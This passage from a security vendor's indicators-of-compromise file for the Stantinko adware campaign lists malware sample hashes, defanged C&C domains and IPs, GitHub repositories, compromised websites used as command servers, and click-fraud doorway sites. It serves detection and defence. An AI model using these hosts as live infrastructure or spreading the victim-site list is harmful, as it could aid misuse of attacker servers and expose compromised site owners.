@@ -1,0 +1,808 @@
+= Stantinko Indicators of Compromise (IOCs)
+
+These IoCs are related to ESET's investigation on Stantinko. The full report
+about Stantinko is available at
+https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf.
+
+The condensed blog post about Stantinko is available at
+https://www.welivesecurity.com/2017/07/20/stantinko-massive-adware-campaign-operating-covertly-since-2012/.
+
+These IoCs are also available in MISP event format:
+link:stantinko.misp-event.json[`stantinko.misp-event.json`]
+
+== Samples
+
+.APIHelper.dll
+
+----
+84A055D8E4BDF1F140C4DCA3D2D7738027E07115
+----
+
+.APIHelper_64.dll
+
+----
+BCBC28219D47097FBCE312DA450B84079689A0BF
+----
+
+.bhctrl32.exe
+
+----
+125CEDE073FC3578C9D4C92A858B92C6D551BB0E
+A2956B05909E48F82F6FC9A690A64D4F0B2A61C8
+D40CAC5DB9A23B372E606039DCE080BCFB9830CC
+FE25D078DFD99091C3EF189567728BD087750FAE
+----
+
+.biosysrt.dll
+
+----
+3A543E3CFE380AE404759FCCE4B3E25DE52246C9
+----
+
+.bstreamsvc.dll
+
+----
+1D50CF65D326545B02C3EAEF99FAEAAA5629AE94
+C7A04F5A7A09D9674B2CA50EDAD882E050785169
+EAE094FDA8D431CB8CDEFC9687C8B4CB1B7E2A22
+----
+
+.bstreamsvc_setup.dll
+
+----
+B8AA1B3DEC9B4B16B6A4BC274C093EED09E2BC4C
+----
+
+.clearcache.dll
+
+----
+899A71BAABFCF47F5FE31A651271D038C2619EDF
+----
+
+.create_certificate.dll
+
+----
+729B6F4D97F76DCE0F474D7D9F5E15FDD01E4998
+----
+
+.certificate.dll
+
+----
+DB83BE912A25D99F501212FED8FA45672D362E67
+----
+
+.d3dadapter.dll
+
+----
+11354E648E41529972E6696631E035CF8BF0C537
+1817B2B958FE7FCE0D0383B8D304BD55A6FECEB2
+1BAF0A6E8C9DDBDFFF825686C2BA7E846FB65AEC
+272AECA0B66ED1DEA435059481C8EE7045E44E23
+31883581FE416A454A00B223357ECAF6E4353497
+31E119C3D252C2AE1C18E554DCF47ED359A67AD2
+36E11C5BFA3C05094B3FBBA39697533F63B299DB
+52D9D26EF37A3B42A0D68E4383B73FD4D2B10018
+56696CA2E4C85541909391E086E7D934601656D8
+587659A8AB5617594F8064EF16CAAD082A773C7A
+84D9F7F46810B1ADD636B07C4068517AD1B3FD07
+8843F69F530A712568567A2D53DA01889FF9ACB9
+957C69E52E2A3A16838051598A7B2E5BA3D54836
+ACAF69EFC397031A7CA14E8E4B6E2D9E9DE28892
+D2770182CE996454AA8EAFA5C96629ACCF05A06A
+D6A59F6DD9E39EE26059C43D2E097A823770E161
+F9DC53A63D721D0936BE8C04331E341AC2558162
+----
+
+.d3dadapter dropper
+
+----
+B14AF8814FE0398FFA8F5B0D76141B576E5CCE27
+FBDBABC6C3E274B99BDFDAB79E53B29ECCF114EF
+----
+
+.fdclient.dll
+
+----
+0876F8D54F152B1ABA741004635C53A835007226
+51196DD8D364947B17ACFA3EFCFC1AFA86CD44C3
+886749473A29B887E8F8A79A7C3FB620D30BCB01
+96B3A1FDFE1AA113B7791C15A57CFBBD360CC223
+B35DA904E72868361954A27E87521EE4E0FD0AC6
+B705F104DE0E8E43DA9AC13BA5F42DD3DA21037B
+D06DE631AAA7A7BC1FFFA12054111BEC2A7D838D
+----
+
+.FileTour related files
+
+----
+06EB77205E4822A4369E9C7B43F4554248DD6FFA
+2E9F4C6BD233799AA2AFEC9C440C737AE4114DDE
+30139FB0B37472D02FE5ECB62F211CCFE727FD6D
+40863793206684A021ABB1E24D524FDDF8410AB6
+7167649EB03569C2643BCF2C2F2164EA0D803A8D
+8E3D8606ED916152B8F70D5E38026569BB7A20C4
+A5C3076F4E38A9E497F120558DB669FDD139E702
+D274FD9C8AFC8FB2DAE8E81E4F6CC41592C385DF
+----
+
+.ghstore.exe
+
+----
+E2F2532632A0ACBC6367716F82F7B62D64B896B5
+----
+
+.ihctrl32_setup.dll
+
+----
+C9C2D2239C5371DCD6A36AE66380B615578E5B04
+----
+
+.ihctrl32.dll
+
+----
+032B324368B3854F4EC96BE74E067D146B43F856
+0B64F28DD56D4869ED7ECAEA81D0F7E6DCBEFA36
+4FD7A5F602E4645EB8F21BAA127EDEB9C76CCB50
+728718D1AD01B07FCD31C0A4FA2C975B98DB29F1
+742EA38F09FF53626194D8B411E290B09F93EDA4
+80C4A4FD10409742C10B4399AD7C31AFEA726A8D
+B6CFDA9777EEF218E36A1A082C175CB6121CDB48
+BC126956059188E2155113D2F77D5FF632B9D420
+CB89F13D6EFBB8EBA87AB3FE3AC92A0AA738AD2D
+D00C953FD7D6CB686036BB264D52F38C2CECEA76
+F74ED6DFB1719924197459D7E5CFDF00568B86FB
+----
+
+.ir16_32.dll
+
+----
+8EF4E038E14E2C853DD304DF78C3CF09176ADB65
+962AA58834B2D071D3F8C68E893D3FDC2FEE32F3
+9F79F982F8EEF45D5A1FC3120C5DEA2D8EC618A0
+B85E4652910D413D19718B819736B44133FDB332
+C269C83B3D18C01DAF9C296A198323889D339B9F
+C9F1232DC368A828F576D6F9E8922C0DF27A33DB
+E8D9F9A6BEC99BE13FFDF3D2F5EF74EF634EB508
+----
+
+.kbdmai.dll
+
+----
+0FA4A2C2F41056E071097BF9DB5312E820E3512A
+199DA0C38EB00E495D864D95F078912EEB35639A
+5287CE5827FFEEC6957F1F6DC769D25482479EE3
+DA4634BD5B96519697D06D9A8F18B735302A65EA
+----
+
+.kbdmai dropper
+
+----
+526B86CA02CCEAF5D23C467C1D1F81DD0A36E4B9
+E79ACFBF8D339507373B892700B27B3B795E424F
+----
+
+.KBDMAI_ExtInstaller.dll
+
+----
+343E52B0D30775305951252101526EAEDC8A0D01
+D212F66683F29B5A88AFE2B6B9450DAE3DD73EB4
+----
+
+.npapihelper.dll
+
+----
+1ACCD83D48F041FF362C2B8F2DCF96D6F1583168
+----
+
+.optsatadc.dll
+
+----
+3B2D848030289F8F569C80193DD940FA3AE396C2
+4D3A703DB690E975540D6D29CDAB2F75FBBCB61C
+ADE31CC1161C06A968B68C15E4CE249AE82BC35D
+BE756BA78F52061AE745FC3D01D97300F06F70F6
+----
+
+.optsatadc_setup.dll
+
+----
+326406A85486418B0DF5878B38A2436F11082411
+----
+
+.remote_safe_surfing_flag
+
+----
+A9C96E00C1D1B7AAEE01C30719C5068BBE196B20
+----
+
+.themctrl.dll
+
+----
+03A5849E0DBE89E0727C8C37F4259623C9C131E3
+544ED609F59C6FB2C96A566631293109172375F9
+6004089B1678104252E02E272443A993106C912B
+6B0FC0F7BCF63DB2778634644F5819E6247AD524
+6DB4BE7100B317FD9CBC136DC95C4017F6D56612
+F09352158B443FA3DB0567EF4147D94D37DBDD09
+F3846AEF680EAA1931F75977B2ADD060D2BD3167
+----
+
+.udsetup.exe
+
+----
+52F44D45563944CF7735BCB6F0C448C3E9F19D04
+----
+
+.udservice.exe
+
+----
+0A7C1817A49E9C258DF7B3CFC416BC16A8D28C0B
+352E05DC607AF2EE7CD3BD3FFCC546D3D29F786E
+----
+
+.udservice_dropper
+
+----
+0146F1042B360C8080D4D05FF523C3B80AC88069
+EF3AFF545C48F658C021DC3E5F574AED50BE726E
+----
+
+.vp9core.dll
+
+----
+C897A193A13A60CC98AAAD9CB9E18AECB68797DE
+FF9181C441AAA9108BC35B45B989B2725AD4BBF9
+----
+
+.wbiosrvp.dll
+
+----
+420A98F44832C11D4E56037F1F267207830BA03B
+8750E5E2647C6A9DAB1E0AE60CC42246DA2186B2
+F613948CE8F5358B9940EE22E9FCFC26F171637D
+----
+
+.wlanmgr.dll
+
+----
+10E2B8A796766A6F83278799BE16B1BF47544F2B
+12553394AE9C099D9079DF19F0680CBE5CD780D4
+1C8D54F0DB1136FA067F88A0AD8F0A8225854E72
+3AF1739A03B3A70705E44049B008DF34290CE3BD
+6141110309EF5C08DEC5746DBFB25B6302C6D887
+6FAE5E3BB8910FCCF89208E3377C8AAD802D9BF8
+7743BCAB7A2D77F83197F31A01C754C73BE46EAA
+----
+
+.wsaudio.dll
+
+----
+138ADDB8845C5F1999E2CCADB3BB7FC57D8ACCE8
+2A9A15ED58CD54142E149DB48511B8FD4EFB1E89
+5B54776D3C0085596ED7FF695A90B299B575DAFB
+758FE5DF8EDAC61101AF35AA1F4440DBEC617F25
+8BBA63FD06FC0948579A0F780EC4C0916F265D29
+b84598b0329dde4b93fc32be2abac020f7b1e7d8
+----
+
+.Linux/TrojanProxy.Stantinko.A
+
+----
+C55918ADC6D2E74809777B306E361EA01A35FC05
+----
+
+.wsaudio_setup.dll
+
+----
+CD47C020BF420964BE329A3F2BC7FEE83BD2FACE
+----
+
+.yasetup.exe
+
+----
+D1F774D54BCC176AC33900085B27F62A1732B9B7
+----
+
+
+.get_hdd.dll
+
+----
+F90BBF5444F42B383B26350231DFDA002911801A
+----
+
+.remove_plugins_installer.dll
+
+----
+AD4E55CF03F9C24ABE2C533EE33FACD7C70A2EDA
+C9DE95EC81BE649D796C73B5BC90CAC95C5EBBD8
+----
+
+.brutplugin.dll
+
+----
+5FA986F18BDDA5C6AD4C2F2CF9608752AC797377
+----
+
+.facebook_bot.dll
+
+----
+D643F426B9FAF032FF5AF7D070D2E5115B3C2E46
+----
+
+.radmin.dll
+
+----
+BFC7C0383CD87382575543C89E99EB41898F59EB
+----
+
+.zaxar.dll
+
+----
+C05D2646029DF48E262061DEF69DD8A55BF40F75
+----
+
+.search_parser.dll
+
+----
+2E726A679D32D6A29ECC7A9215409DEFA3085150
+----
+
+.Malicious Browser Extensions
+
+----
+The Safe Surfing
+Teddy Protection
+----
+
+.The Safe Surfing NaCl binaries
+
+----
+340622C8D335CDE73EEAA96F461440EDCB7D4C52
+43A108A22925282D9AC02B8752EACF796B532C1E
+49603FEC4DFA0AC5AF3300039522855920D84530
+----
+
+== C&C servers
+
+[option="header"]
+.Stantinko's C&C servers
+|=====
+|Family name | Component |  Domain
+|Adstantinko | udsetup.exe | clients1.ultimate-discounter[.]com
+|Adstantinko | udsetup.exe | clients2.ultimate-discounter[.]com
+|Adstantinko | udsetup.exe | clients3.ultimate-discounter[.]com
+|Browser Extension | APIHelper | apihelper[.]org
+|Browser Extension | The Safe Surfing | safesurfing[.]me
+|Browser Extension | Teddy Protection (Lite) | teddy-protection[.]com
+|Browser Extension | Teddy Protection (Lite) | superbear[.]pro
+|Browser Extension | Teddy Protection (Lite) | teddysave[.]me
+|Browser Extension | Teddy Protection (Lite) | judgebear[.]pro
+|Browser Extension Downloader Service | ihctrl32.dll | icloudsrv[.]com
+|Browser Extension Downloader Service | ihctrl32.dll | icloudsrv[.]org
+|Browser Extension Downloader Service | ihctrl32.dll | icloudsrv[.]info
+|Browser Extension Downloader Service | ihctrl32.dll | icloudsrv[.]net
+|Browser Extension Downloader Service | themctrl.dll | robothemes[.]net
+|Browser Extension Downloader Service | themctrl.dll | tmrobo[.]com
+|Browser Extension Downloader Service | themctrl.dll | tmrobo[.]org
+|Browser Extension Downloader Service | opsatadc.dll | hdr-group[.]org
+|Browser Extension Downloader Service | opsatadc.dll | hdr-group[.]info
+|Browser Extension Downloader Service | opsatadc.dll | hdr-group[.]net
+|Linux Trojan Proxy | / | 185.28.22[.]22:81
+|Linux Trojan Proxy | / | 195.226.218.[.]234:80
+|Old Browser Extension Downloader Service | ir16_32.dll | wsslupdate[.]org
+|Old Plugin Downloader Service | d3dadapter.dll | d3dupdate[.]com
+|Old Plugin Downloader Service | d3dadapter.dll | mserrep[.]org
+|Old Plugin Downloader Service | KBDMAI.dll | kbdmai[.]net
+|Old Plugin Downloader Service | KBDMAI.dll | wupdateservice[.]us
+|Old Plugin Downloader Service | wlanmgr.dll | wadgeotrust[.]com
+|Plugin Downloader Service | wsaudio.dll | wsaudio[.]com
+|Plugin Downloader Service | wsaudio.dll | wsaudio[.]net
+|Plugin Downloader Service | wsaudio.dll | wsaudio[.]org
+|Plugin Downloader Service | bstreamsvc.dll | vp9codec[.]com
+|Plugin Downloader Service | bstreamsvc.dll | vp9codec[.]net
+|Plugin Downloader Service | wbiosrvp.dll | biosysltd[.]com
+|Plugin Downloader Service | wbiosrvp.dll | biosysltd[.]org
+|PDS Plugin | get_hdd.dll | 185.28.22[.]22
+|PDS Plugin | search_parser.dll | hxxp://raw.githubusercontent.com/brenev/collection/master/index
+|PDS Plugin | brut_plugin.dll | 185.28.22[.]22
+|PDS Plugin | facebook_bot.dll | 185.28.22[.]22
+|PDS Plugin | radmin.dll | 93.188.161[.]17:8000
+|Stantinko Installer | udservice.exe | update.ultimate-discounter[.]com
+|Stantinko Installer | udservice.exe | udiscount[.]net
+|Stantinko Installer | udservice.exe | ultimate-discounter[.]org
+|Stantinko Installer | udservice.exe | upd-discounter[.]com
+|Stantinko Installer | udservice.exe | udiscounter[.]org
+|Stantinko Installer | udservice.exe | wannaupdate[.]com
+|Stantinko Installer | ghstore.exe | ghosterystore[.]com
+|Stantinko Installer | bhctrl32.exe | nvccupdate[.]com
+|Stantinko Installer | redisd.exe | rdsbase[.]com
+|=====
+
+=== Stantinko GitHub repositories
+
+----
+hxxps://www.github.com/brenev/collection
+hxxps://www.github.com/svetlanachudinovskih/core
+hxxps://www.github.com/alexandra-ivanyan/png
+hxxps://www.github.com/romochka-shevchenko-2015/rebranding
+hxxps://www.github.com/elina-golubeva/style
+hxxps://www.github.com/kurenkov2014/attachments
+hxxps://www.github.com/lenusyashparteeva/losed_data
+hxxps://www.github.com/varvarakayusova/images
+hxxps://www.github.com/anatoly-mescheryakov/icons
+hxxps://www.github.com/vlabygina/clipart
+hxxps://www.github.com/grishenka-kobzar/promo
+hxxps://www.github.com/kabanovmihail/static
+hxxps://www.github.com/shapovalovnikolayy/static
+hxxps://www.github.com/SaintJson/core
+hxxps://www.github.com/umnoffvladislaw/core
+----
+
+=== IP Addresses
+
+----
+13.58.23[.]11
+13.58.249[.]138
+18.220.21[.]112
+37.97.245[.]128
+62.109.0[.]227
+80.82.67[.]154
+80.87.202[.]246
+82.146.59[.]86
+85.17.194[.]202
+88.99.154[.]39
+89.108.124[.]228
+91.206.30[.]108
+91.206.30[.]109
+93.188.161[.]17
+95.213.235[.]197
+95.46.98[.]12
+104.237.4[.]37
+107.174.224[.]254
+107.181.174[.]28
+136.144.141[.]253
+144.217.240[.]28
+149.56.201[.]76
+178.20.157[.]140
+178.20.157[.]187
+178.20.157[.]189
+178.20.157[.]227
+178.20.159[.]56
+178.20.159[.]77
+178.20.159[.]89
+185.118.164[.]190
+185.125.218[.]74
+185.127.24[.]151
+185.28.22[.]22	
+185.28.22[.]69
+185.47.62[.]128
+185.48.239[.]11
+185.86.76[.]113
+195.226.218[.]234
+204.155.30[.]72
+210.16.101[.]206
+217.12.203[.]18
+----
+
+=== List of compromised websites with their date of first appearance (Search parser C&C)
+
+----
+Jan 21, 2014 | hxxp://www.corsionlinemtpromozione.it/images/banners/b1/index.php
+Jan 21, 2014 | hxxp://xn--elprincipenorteo-lub.com.ar/images/banners/b1/index.php
+Jan 21, 2014 | hxxp://www.ucguabira.com/images/banners/b1/index.php
+Jan 21, 2014 | hxxp://www.unioncasa.org/images/banners/b1/index.php
+Jan 21, 2014 | hxxp://localhost/searchparser/index.php
+Jan 21, 2014 | hxxp://www.unique7000.org/en/images/banners/b1/index.php
+Feb 19, 2014 | hxxp://www.sfcu.com.au/sfcu/images/banners/b1/index.php
+Feb 19, 2014 | hxxp://eventsbyexcellence.com/photography/images/banners/b1/index.php
+Feb 19, 2014 | hxxp://grupoportusalud.net/images/banners/b1/index.php
+Feb 19, 2014 | hxxp://missionlocalenyonspierrelatte.com/images/banners/b1/index.php
+Feb 19, 2014 | hxxp://talsma-co.nl/images/banners/b1/index.php
+Nov 5, 2014 | hxxp://scorzapesquisa.net/site/images/banners/b1/index.php
+Nov 5, 2014 | hxxp://fotopercepcja.pl/images/banners/b1/index.php
+Apr 16, 2015 | hxxp://cdvet.ch/images/banners/b1/index.php
+Apr 16, 2015 | hxxp://www.menicon.fr/porteurs/images/banners/b1/index.php
+Apr 16, 2015 | hxxp://topperclean.nl/images/banners/b1/index.php
+Apr 16, 2015 | hxxp://iguabaonline.com.br/quasar/images/banners/b1/index.php
+Apr 17, 2015 | hxxp://hlcl.org/joomla15/images/banners/b1/index.php
+Apr 27, 2015 | hxxp://www.corsionlinemtpromozione.it/frigocontact/images/banners/b1/index.php
+Apr 27, 2015 | hxxp://lucerne.websitewelcome.com/~trinityc/images/banners/b1/index.php
+Apr 27, 2015 | hxxp://portal.antreprenor.upb.ro/images/banners/b1/index.php
+Apr 27, 2015 | hxxp://gruppo89.org/images/banners/b1/index.php
+Apr 27, 2015 | hxxp://79.170.44.132/nn-projects.co.uk/images/banners/b1/index.php
+Apr 27, 2015 | hxxp://veterinariostijuana.com/images/banners/b1/index.php
+May 30, 2015 | hxxp://xado1.md/images/banners/b1/index.php
+Jun 10, 2015 | hxxp://z272081.infobox.ru/images/banners/b1/index.php
+Jun 10, 2015 | hxxp://oyqrznx.wwwhl.ru/2014/images/banners/b1/index.php
+Jun 23, 2015 | hxxp://bernadettejansen.nl/site/images/banners/b1/index.php
+Jun 23, 2015 | hxxp://srpskicetnickipokret.org/scp/images/banners/b1/index.php
+Jun 23, 2015 | hxxp://blau-weiss-grenzenlos.de/images/banners/b1/index.php
+Aug 5, 2015 | hxxp://liceosilvestri.it/cms/images/banners/b1/index.php
+Aug 10, 2015 | hxxp://esportesnovasoure.com.br/images/banners/b1/index.php
+Aug 10, 2015 | hxxp://hotel-idol.com/tr/images/banners/b1/index.php
+Aug 24, 2015 | hxxp://wiewiese.bauernhof-urlaub.or.at/images/banners/b1/index.php
+Aug 24, 2015 | hxxp://www.swrs-weinsberg.de/images/banners/b1/index.php
+Aug 27, 2015 | hxxp://hohnstorf-basketball.de/alt/images/banners/b1/index.php
+Nov 26, 2015 | hxxp://www.ismailagenturen.com/images/banners/b1/index.php
+Nov 26, 2015 | hxxp://judoclub2haine.be/images/banners/b1/index.php
+Nov 26, 2015 | hxxp://moradiaecidadania.org.br/images/banners/b1/index.php
+Nov 26, 2015 | hxxp://romsee-stavelot-romsee.be/images/banners/b1/index.php
+Nov 26, 2015 | hxxp://parafia-srokowo.pl/images/banners/b1/index.php
+Dec 4, 2015 | hxxp://soymocano54.com/images/banners/b1/index.php
+Dec 4, 2015 | hxxp://sleepatastridlindgrensworld.se/images/banners/b1/index.php
+Dec 4, 2015 | hxxp://antalyainsaatdergisi.com/images/banners/b1/index.php
+Dec 4, 2015 | hxxp://www2.karate-st-georgen.at/images/banners/b1/index.php
+Feb 23, 2016 | hxxp://ns2.huespedvirtualserver.com/images/banners/b1/index.php
+Feb 24, 2016 | hxxp://www.uvdr-vg.hr/images/banners/b1/index.php
+Feb 24, 2016 | hxxp://jason.shigadigsample.com/images/banners/b1/index.php
+Feb 24, 2016 | hxxp://informatikundgesellschaft.de/joomla/images/banners/b1/index.php
+Apr 20, 2016 | hxxp://scuolasanfrancescodassisi.net/images/banners/b1/index.php
+Apr 20, 2016 | hxxp://gesund-bewegen.ch/cms/images/banners/b1/index.php
+Apr 20, 2016 | hxxp://quali-kleen.com/taste/images/banners/b1/index.php
+Apr 20, 2016 | hxxp://kevin-drieschner.de/feuerwehr_cms/images/banners/b1/index.php
+Apr 20, 2016 | hxxp://sv-limbach.de/images/banners/b1/index.php
+Apr 20, 2016 | hxxp://wittmund-restaurant-residenz.de/images/banners/b1/index.php
+Apr 20, 2016 | hxxp://old.novedvory.eu/dokumenty/banners/b1/index.php
+Apr 20, 2016 | hxxp://www.parkbetreuung-margareten.at/cms/images/banners/b1/index.php
+Apr 20, 2016 | hxxp://www.lambertrentals.com/portal/images/banners/b1/index.php
+Apr 20, 2016 | hxxp://www.goldundpartner.at/images/banners/b1/index.php
+Apr 20, 2016 | hxxp://egypttoursgate.com/family-holidays-luxury-vacations/images/banners/b1/index.php
+Apr 20, 2016 | hxxp://pepijnenvalerie.nl/joomla/images/banners/b1/index.php
+Apr 20, 2016 | hxxp://kmz-buchen.de/joomla/images/banners/b1/index.php
+May 25, 2016 | hxxp://mobilhome.montourey.free.fr/images/banners/b1/index.php
+Jun 23, 2016 | hxxp://sailbajaadventures.com/images/banners/b1/index.php
+Jun 23, 2016 | hxxp://weddingsbeautiful.com.mx/weddings/images/banners/b1/index.php
+Jul 1, 2016 | hxxp://s17drohobych.freehostia.com/images/banners/b1/index.php
+Jul 1, 2016 | hxxp://zharyk.com.kz/rus/images/banners/b1/index.php
+Jul 4, 2016 | hxxp://otmetka5ballov.ru/images/banners/b1/index.php
+Jul 18, 2016 | hxxp://parafia-srokowo.pcspace.pl/images/banners/b1/index.php
+Jul 18, 2016 | hxxp://www.florestal.gov.br/pngf/images/banners/b1/index.php
+Jul 18, 2016 | hxxp://multfestas.com.br/2013/images/banners/b1/index.php
+Jul 31, 2016 | hxxp://asti.bplaced.net/images/banners/b1/index.php
+Aug 4, 2016 | hxxp://yorkshire-chimneys.co.uk/images/banners/b1/index.php
+Aug 4, 2016 | hxxp://regionarequipa.gob.pe/dependencias/grcet/images/banners/b1/index.php
+Aug 4, 2016 | hxxp://pescarafclive.altervista.org/images/banners/b1/index.php
+Aug 4, 2016 | hxxp://www.powisstreetdentalpractice.com/images/banners/b1/index.php
+Aug 4, 2016 | hxxp://mytrade-agriculture.com/images/banners/b1/index.php
+Aug 4, 2016 | hxxp://alexincerti.xoom.it/images/banners/b1/index.php
+Aug 9, 2016 | hxxp://zarin-daneh.com/images/banners/b1/index.php
+Aug 23, 2016 | hxxp://explora.ulagos.cl/cienciaviva/images/banners/b1/index.php
+Aug 26, 2016 | hxxp://d2062745.instant.xoom.it/siteapps/66587/htdocs/images/banners/b1/index.php
+Aug 26, 2016 | hxxp://waldwichtel-haemelerwald.de/images/banners/b1/index.php
+Sep 2, 2016 | hxxp://royerodistrilab.com/nelsonroyero/images/banners/b1/index.php
+Sep 12, 2016 | hxxp://152.74.9.14/UNITEP/images/banners/b1/index.php
+Sep 12, 2016 | hxxp://vinculacion.coparmexcoahuila.org.mx/images/banners/b1/index.php
+Sep 12, 2016 | hxxp://kreds19-frederikshavn.dk/images/banners/b1/index.php
+Sep 12, 2016 | hxxp://mult.chandra.ac.th/cw/ge/images/banners/b1/index.php
+Sep 13, 2016 | hxxp://m2mobili.com/images/banners/b1/index.php
+Sep 13, 2016 | hxxp://rha93.free.fr/images/banners/b1/index.php
+Sep 16, 2016 | hxxp://l2campus.com/images/banners/b1/index.php
+Oct 5, 2016 | hxxp://codigosurbanos.com/v4/images/banners/b1/index.php
+Oct 6, 2016 | hxxp://codigosurbanos.com/v4/images/banners/b1/index_n.php
+Oct 6, 2016 | hxxp://feuerwehr-hartenstein.de/images/banners/b1/index.php
+Oct 7, 2016 | hxxp://st-johannesstift.de/images/banners/b1/index.php
+Oct 7, 2016 | hxxp://scrisoaredelamosul.ro/santa/images/banners/b1/index.php
+Oct 7, 2016 | hxxp://oneshote.com/Site/joomla/images/banners/b1/index.php
+Oct 13, 2016 | hxxp://conceptosgrupocreativo.com/visionamosSalud/images/banners/b1/index.php
+Oct 14, 2016 | hxxp://www.tangosex.it/images/banners/b1/index.php
+Oct 17, 2016 | hxxp://smksoretulungagung.sch.id/images/banners/b1/index.php
+Oct 19, 2016 | hxxp://shapinglivesconference.com/images/banners/b1/index.php
+Oct 19, 2016 | hxxp://vn-net29.homedns.org/fewo-primbs/images/banners/b1/index.php
+Oct 20, 2016 | hxxp://hinanumbufoundationgh.org/images/banners/b1/index.php
+Oct 20, 2016 | hxxp://dorazio.altervista.org/images/banners/b1/index.php
+Oct 20, 2016 | hxxp://k3bweb78.altervista.org/images/banners/b1/index.php
+Oct 20, 2016 | hxxp://pepekswiata.com.pl/starealejare/images/banners/b1/index.php
+Oct 20, 2016 | hxxp://www.chantalligraphics.com/health101.old/images/banners/b1/index.php
+Oct 20, 2016 | hxxp://banchio.com/pendientes/images/banners/b1/index.php
+Oct 20, 2016 | hxxp://southswimming.com/content/images/banners/b1/index.php
+Oct 20, 2016 | hxxp://edomerlomat.altervista.org/images/banners/b1/index.php
+Oct 24, 2016 | hxxp://roanokecares.com/images/banners/b1/index.php
+Oct 24, 2016 | hxxp://cadexchuquisaca.org.bo/images/banners/b1/index.php
+Oct 25, 2016 | hxxp://laboratoriochimicoveneto.it/lcv/images/banners/b1/index.php
+Oct 25, 2016 | hxxp://142-4-18-114.unifiedlayer.com/images/banners/b1/index.php
+Oct 25, 2016 | hxxp://bobonana.com/familien/images/banners/b1/index.php
+Oct 26, 2016 | hxxp://panaderiasantalibrada.com/main/images/banners/b1/index.php
+Oct 26, 2016 | hxxp://notre370z.com/images/banners/b1/index.php
+Oct 26, 2016 | hxxp://barangayugong.com/images/banners/b1/index.php
+Nov 3, 2016 | hxxp://alkiviadistours.gr/tour/images/banners/b1/index.php
+Nov 8, 2016 | hxxp://syl-diavitikon-nthess.gr/images/banners/b1/index.php
+Nov 8, 2016 | hxxp://lksavvas.gr/images/banners/b1/index.php
+Nov 9, 2016 | hxxp://tagaras.gr/images/banners/b1/index.php
+Nov 9, 2016 | hxxp://debian.itbiz.gr/enoria_kastaneris/images/banners/b1/index.php
+Nov 9, 2016 | hxxp://energymix.xp3.biz/joomla/images/banners/b1/index.php
+Nov 10, 2016 | hxxp://archiv.nezavisli-zruc.cz/images/banners/b1/index.php
+Dec 1, 2016 | hxxp://kapatex.iluze.com/images/banners/b1/index.php
+Dec 15, 2016 | hxxp://derecskeikutyaiskola.hu/images/banners/b1/index.php
+Dec 15, 2016 | hxxp://alhwaidi4hybrid.com/ar/images/banners/b1/index.php
+Dec 15, 2016 | hxxp://mst.etravelsystem.com/eztproperty/images/banners/b1/index.php
+Dec 15, 2016 | hxxp://alzwea.com/itech-iraq.com/images/banners/b1/index.php
+Dec 20, 2016 | hxxp://zawodnicy.baseball.pl/images/banners/b1/index.php
+Dec 21, 2016 | hxxp://intranet2.marne.chambagri.fr/joomla/images/banners/b1/index.php
+Dec 21, 2016 | hxxp://www.daydream-lab.com/flsh/main/images/banners/b1/index.php
+Dec 21, 2016 | hxxp://rouken.sakura.ne.jp/fittest/images/mod.php
+Dec 21, 2016 | hxxp://rouken.sakura.ne.jp/fittest/images/banners/b1/index.php
+Dec 21, 2016 | hxxp://asandoosh.com/images/banners/b1/index.php
+Dec 21, 2016 | hxxp://smabugisiah.edu.my/images/banners/b1/index.php
+Dec 26, 2016 | hxxp://alhayat-aljadedah.com/images/banners/b1/index.php
+Dec 26, 2016 | hxxp://leadershipacademy.ps/english/images/banners/b1/index.php
+Dec 26, 2016 | hxxp://www.agencija-jajce.ba/arabic/images/banners/b1/index.php
+Dec 26, 2016 | hxxp://vanocnidarky.provsechny.net/images/banners/b1/index.php
+Dec 26, 2016 | hxxp://millerjw.com/czechpoint/images/banners/b1/index.php
+Dec 26, 2016 | hxxp://edomerlomat.altervista.org/images/banners/b1/index.php
+Dec 26, 2016 | hxxp://krystiank.home.pl/autoinstalator/joomla15/images/banners/b1/index.php
+Dec 27, 2016 | hxxp://tommasobocchetti.it/images/banners/b1/index.php
+Jan 30, 2017 | hxxp://vmedia.mk/GinekomedikaCalculators/images/banners/b1/index.php
+Jan 30, 2017 | hxxp://xn----7sbpbmda7aknrei7dwb9f.xn--p1ai/images/banners/b1/index.php
+Jan 30, 2017 | hxxp://vehicleteams.scripts.mit.edu/home/images/banners/b1/index.php
+Jan 30, 2017 | hxxp://dvz.ppi.net.ua/images/banners/b1/index.php
+Jan 31, 2017 | hxxp://irina-petrenko.by/images/banners/b1/index.php
+Jan 31, 2017 | hxxp://usreturns.com/images/banners/b1/index.php
+Jan 31, 2017 | hxxp://wolnywww.instytutslowacki.pl/images/banners/b1/index.php
+Jan 31, 2017 | hxxp://www.kalamari-notes.gr/joomla/images/banners/b1/index.php
+Jan 31, 2017 | hxxp://bukaeva.lg.ua/images/banners/b1/index.php
+Jan 31, 2017 | hxxp://xier.avalon.biz.ua/images/banners/b1/index.php
+Feb 15, 2017 | hxxp://xray.bmc.uu.se/spb/images/banners/b1/index.php
+Feb 15, 2017 | hxxp://aupair-germany.eu/inhalt/images/banners/b1/index.php
+Feb 15, 2017 | hxxp://vicaweb.talentoshow.com/Joomla/images/banners/b1/index.php
+Feb 16, 2017 | hxxp://yik.edu.my/sekolah/mspp/images/banners/b1/index.php
+Feb 16, 2017 | hxxp://treningmentalny.home.pl/m_dddd/images/banners/b1/index.php
+Mar 16, 2017 | hxxp://the-dreamweaver.net/portal/images/banners/b1/index.php
+Mar 16, 2017 | hxxp://eki.szie.hu/erasmusip/images/banners/b1/index.php
+Mar 16, 2017 | hxxp://erasmus.sp9.slupsk.pl/images/banners/b1/index.php
+Apr 3, 2017 | hxxp://sceptretoursandtravel.com/images/banners/b1/index.php
+Apr 25, 2017 | hxxp://alcaldiadematurin.gob.ve/portal3/images/banners/b1/index.php
+Apr 25, 2017 | hxxp://thegamerszone-mgc.com/images/banners/b1/index.php
+May 8, 2017 | hxxp://banueventsolutions.com/images/banners/b1/index.php
+May 23, 2017 | hxxp://kryonschule-ahaus.de/images/banners/b1/index.php
+May 23, 2017 | hxxp://aklcosmetics.com.au/images/banners/b1/index.php
+May 24, 2017 | hxxp://lotto4phone.altervista.org/images/banners/b1/index.php
+May 25, 2017 | hxxp://tim-johnson.com/images/banners/b1/index.php
+May 25, 2017 | hxxp://scrapbook-stickers.com/images/banners/b1/index.php
+May 26, 2017 | hxxp://doscerodesign.com/hele/images/banners/b1/index.php
+----
+
+=== FileTour click-fraud doorway websites
+
+----
+hxxp://good-journal.net
+hxxp://nano-news.info
+hxxp://newssocial.org
+hxxp://news-true.net
+----
+
+=== FileTour click-fraud bitly redirections
+
+----
